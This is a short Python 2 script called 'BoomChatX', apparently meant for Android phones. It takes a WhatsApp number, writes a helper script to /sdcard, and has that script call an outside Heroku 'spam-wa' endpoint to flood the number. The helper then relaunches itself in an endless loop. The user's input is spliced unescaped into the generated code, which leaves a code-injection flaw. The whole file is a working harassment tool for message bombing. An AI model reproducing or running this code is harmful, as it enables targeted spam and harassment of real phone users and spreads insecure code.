import requests
import os
import sys
import time
import random

def __optional__():
    os.system("clear")
    os.system("echo -ne '\033]0;BoomChatX V1.0\007'")
    
def __main__():
    phone_id = raw_input("Nomor WhatsApp > ")
    
    boom = '''
import os
import requests
import sys
        
url = "https://aink-sanz.herokuapp.com/api/free-tutorial-spam-wa"

data = {
    "nomor":"'''+phone_id+'''"
}

TheExploits = requests.get(url, params=data)
if "Berhasil Ngab ! .. Subrek Yt FREE TUTORIAL." in TheExploits.text:
    print("[+] BoomChatX Berhasil Terkirim...")
    os.system("python2 /sdcard/Boom.py")
else:
    print("[+] BoomChatX Gagal Terkirim...")
    os.system("python2 /sdcard/Boom.py")

        '''
    file_boom = open("/sdcard/Boom.py", "w")
    file_boom.write(boom)
    file_boom.close()
    os.system("python2 /sdcard/Boom.py")
__main__()